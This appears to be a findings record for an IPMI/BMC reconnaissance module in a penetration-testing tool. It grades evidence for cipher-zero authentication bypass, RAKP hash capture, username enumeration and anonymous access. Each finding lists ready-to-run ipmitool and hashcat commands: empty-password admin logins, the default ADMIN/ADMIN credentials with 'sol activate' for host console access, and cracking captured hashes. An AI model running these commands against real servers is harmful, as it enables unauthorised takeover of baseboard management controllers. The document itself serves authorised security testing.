summary: One of the deepest modules. GCAC (T0/T1 posture). Cipher-suite 0 hard-confirmed via App/0x54 (T1). RAKP sweep across default+known-user list captures HMAC-SHA1/SHA256 hashes verbatim in hashcat -m 7300/-m 7302 format — that is real crack material (T2). Username enumeration via RAKP status asymmetry is T1. Get Device ID vendor/firmware fingerprint (T0). Missing T3: no post-crack ipmitool session (correctly out of scope per user directive).

findings.tier_evidence: App/0x54 Get Channel Cipher Suites returned an auth_alg=0 record — HARD confirmation the vuln config is live. Any username + any password authenticates as admin.
findings.promotion_notes: Follow-on: send one benign 'chassis power status' via ipmitool -C 0 -U root -P '' — probe SUCCEEDS only if server accepts arbitrary auth, giving proof-of-admin. Per airgap + read-only directive this is a manual step.
findings.tester_next_step: ipmitool -I lanplus -C 0 -H IP -U root -P '' user list ; ipmitool -I lanplus -C 0 -H IP -U root -P '' chassis power status  # if either succeeds, full BMC admin

findings.tier_evidence: Heuristic from GCAC ('none' auth type + IPMI 2.0) — inference, not a hard confirmation.
findings.promotion_notes: Currently downgraded when App/0x54 doesn't answer; already promoted via ipmi_cipher_zero_confirmed when it does.
findings.tester_next_step: ipmitool -I lanplus -C 0 -H IP -U <any> -P anything user list  # if succeeds, cipher-0 is real

findings.tier_evidence: Auth Status byte bits 0/1 — a real BMC-reported posture that only fires when the daemon says anonymous/null-user is enabled.
findings.promotion_notes: Chain: ipmitool with U='' P='' -> user list -> if admin default (ADMIN/admin) works, full BMC control.
findings.tester_next_step: ipmitool -I lanplus -H IP -U '' -P '' user list ; ipmitool -I lanplus -H IP -U ADMIN -P ADMIN sol activate  # KVM/serial into host

findings.title_pattern: IPMI weak auth algorithm(s) advertised: MD2/MD5
findings.tester_next_step: review GCAC output; MD5 hash is captured via ipmi_rakp_hash separately

findings.title_pattern: IPMI RAKP hashes captured (RMCP+ password HMAC is offline-crackable)
findings.tier_evidence: recce performs a real RMCP+ Open Session + RAKP1 exchange, receives the server-computed HMAC, and writes a valid hashcat -m 7300/7302 line — a real crack primitive per user + per algorithm. Non-destructive.
findings.promotion_notes: Automate hashcat crack loop against captured hashes; on success feed cracked cred back to ipmitool for session — the sessions/rakp promotion tier.
findings.tester_next_step: hashcat -m 7300 loot/ipmi.hash /usr/share/wordlists/rockyou.txt --force ; then ipmitool -I lanplus -H IP -U <user> -P <cracked> user list ; sol activate

findings.title_pattern: IPMI username enumeration via RAKP status codes
findings.tier_evidence: Deterministic: some users produce hashes, others get 'invalid role' — that response asymmetry only appears if the BMC distinguishes existing accounts. Real names surfaced.
findings.promotion_notes: Widen the known_users sweep and cite exact accounts; already implemented.
findings.tester_next_step: Extend probe with --rakp-users <big-list>; feed valid users to hashcat crack loop focused on those accounts.

findings.promotion_notes: Would need to actually inject a spoofed IPMI command into an observed session — destructive/impractical.
findings.tester_next_step: review GCAC output; capture a live session with tcpdump and inspect for MAC-less messages

findings.tier_evidence: Bit 3 of Auth Status: user-priv commands take no auth. When set, unauth sensor/SEL reads are the actual data leak — deterministic.
findings.promotion_notes: Actively send a sensor-read at USER priv with auth-type NONE and record the returned SDR/SEL — proves the leak.
findings.tester_next_step: ipmitool -I lan -H IP -A NONE sensor list ; ipmitool -I lan -H IP -A NONE sel list

findings.promotion_notes: Correlates with ipmi_rakp_hash crack difficulty; not standalone.
findings.tester_next_step: note in report; combine with any captured RAKP hash

findings.tier_evidence: Get Device ID App/0x01 vendor + firmware fingerprint.
findings.promotion_notes: Feed to vendor advisory correlation externally.
findings.tester_next_step: ipmitool -H IP -I lan mc info  # cross-check the same fields
